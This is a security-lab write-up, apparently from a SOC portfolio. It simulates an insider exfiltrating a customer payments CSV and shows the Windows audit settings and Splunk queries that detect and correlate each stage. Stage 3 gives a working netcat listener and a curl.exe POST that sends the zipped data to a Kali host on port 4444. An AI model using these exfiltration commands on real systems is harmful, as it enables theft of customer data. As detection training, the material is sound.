# Phase 5 — Insider Threat & Data Exfiltration

## Overview
A Finance department account on FIN-WKS-04 accesses, stages, and exfiltrates customer payment data. No attacker tools — this is a legitimate account misusing standing access. The full 3-stage kill chain is detected and correlated into a single Splunk incident using the `transaction` command.

This is the centerpiece of the lab. It covers ground neither Wazuh nor Sentinel labs touch, and it required explicitly enabling three separate Windows audit subcategories that are disabled by default.

---

## The Scenario

**Target file:** `C:\CustomerExports\payments_export.csv`
Contains: customer_id, name, card_last4, transaction amount

**Actor:** `ronakmishra` — Finance department account with legitimate read access to CustomerExports

**3-stage kill chain:**

| Stage | Action | MITRE | Detection |
|---|---|---|---|
| 1 | Read `payments_export.csv` | T1005 Data from Local System | Event ID 4663 |
| 2 | `Compress-Archive` → `export.zip` on Desktop | T1560.001 Archive Collected Data | Event ID 4103 |
| 3 | `curl.exe` POST → Kali (10.0.0.100:4444) | T1048 Exfiltration Over Alt Protocol | Event ID 5156 |

---

## Setup — What Had to Be Enabled

None of these are on by default. All three had to be explicitly enabled:

```powershell
# File System auditing
auditpol /set /subcategory:"File System" /success:enable /failure:enable

# Process Creation (for general process logging)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Command line in process creation events
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

# PowerShell Module Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

# Filtering Platform Connection (network events)
auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable
```

Also required: a **SACL** (System Access Control List) on the `CustomerExports` folder to tell Windows to generate an audit event whenever anyone accesses it.

---

## Stage 1 — File Access

Finance account reads the payment CSV. Event ID 4663 fires — captures exact filename, account, access type, and the process that performed the read (`powershell.exe`).

**Detection query:**
```spl
index=windows EventCode=4663 Object_Name="*CustomerExports*"
| table _time, Account_Name, Object_Name, AccessMask
```

![CustomerExports folder created](../screenshots/phase5/phase5-01-customerexports-folder-created.png)

![Event 4663 detected](../screenshots/phase5/phase5-03-event4663-detected.png)

The expanded event shows exactly:
- **Object Name:** `C:\CustomerExports\payments_export.csv`
- **Account Name:** `ronakmishra`
- **Accesses:** `ReadData`
- **Process:** `powershell.exe`

---

## Stage 2 — Compression

`Compress-Archive` packages the file into `export.zip` on the user's Desktop.

**Critical finding:** This does **not** trigger Event ID 4688 (Process Creation). Native PowerShell cmdlets like `Compress-Archive` run inside the existing PowerShell engine — they don't spawn a new child process. An analyst relying solely on 4688 would miss this stage entirely.

Detection required **Event ID 4103** (PowerShell Module Logging), which captures full parameter bindings for every cmdlet execution — including exact source and destination paths.

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4103
| where match(_raw, "(?i)Compress-Archive")
| table _time, ComputerName, _raw
```

![Data compressed on Desktop](../screenshots/phase5/phase5-04-data-compressed.png)

![Event 4103 compression detected](../screenshots/phase5/phase5-05-event4104-compress-detected.png)

The 4103 event captures:
- **Command:** `CompressFilesHelper`
- **sourceFilePaths:** `C:\CustomerExports\payments_export.csv`
- **destinationPath:** `C:\Users\ronakmishra\Desktop\export.zip`
- **User:** `RONAKMISHRA345C\ronakmishra`

---

## Stage 3 — Exfiltration

`curl.exe` transmits the archive to Kali's netcat listener on port 4444.

**On Kali:**
```bash
nc -lvnp 4444 > received_data.txt
```

**On FIN-WKS-04:**
```powershell
curl.exe -X POST --data-binary "@C:\Users\$env:USERNAME\Desktop\export.zip" http://10.0.0.100:4444/
```

**Result:** 431-byte archive received on Kali — confirmed intact.

![Exfiltration received on Kali](../screenshots/phase5/phase5-06-exfiltration-received.png)

![File confirmed received](../screenshots/phase5/phase5-07-exfiltration-file-confirmed.png)

**Detection query:**
```spl
index=windows EventCode=5156 Destination_Port=4444
| table _time, Application_Name, Source_Address, Destination_Address, Destination_Port
```

![Event 5156 exfiltration detected](../screenshots/phase5/phase5-08-event5156-network-detected.png)

The 5156 event shows:
- **Application:** `\device\harddiskvolume4\windows\system32\curl.exe`
- **Source:** `10.0.0.32` (FIN-WKS-04)
- **Destination:** `10.0.0.100` (Kali)
- **Port:** `4444`

---

## Centerpiece — Full Kill Chain Correlation

All three stages in a single query using `transaction`:

```spl
index=windows (EventCode=4663 Object_Name="*CustomerExports*")
    OR (EventCode=4103 _raw="*CompressFilesHelper*")
    OR (EventCode=5156 Destination_Port=4444)
| transaction host maxspan=30m
| where eventcount >= 3
| table _time, host, eventcount, duration
```

**Result: 27 raw events → 1 correlated incident · ~25 minute transaction window on RONAKMISHRA345C**

![Full attack chain timeline](../screenshots/phase5/phase5-09-correlated-attack-chain.png)

![Transaction correlation result](../screenshots/phase5/phase5-10-transaction-correlation.png)

This single query automatically reconstructs the full incident. It only fires when all three stages occur on the same host within 30 minutes — dramatically reducing false positive noise compared to alerting on each stage individually.

---

## Key Findings

1. **Native PowerShell cmdlets bypass Event ID 4688** — the most important technical finding in this phase. Any SOC that relies only on process creation auditing will miss PowerShell-based staging.

2. **Three audit subcategories are disabled by default** — File System (4663), PowerShell Module Logging (4103), and Filtering Platform Connection (5156). A default Windows 11 workstation gives you almost zero insider threat telemetry without explicit hardening.

3. **`transaction` is the right tool for multi-stage insider incidents** — individual stage detection generates noise. Correlation by host within a time window generates one actionable alert per incident.

---

Full incident report: [IR-MER-2026-002](../incident-reports/IR-MER-2026-002-insider-data-exfiltration.md)

← [Phase 4](phase4-owasp-detection.md) | [Back to README](../README.md) | [Phase 6 →](phase6-alerts.md)
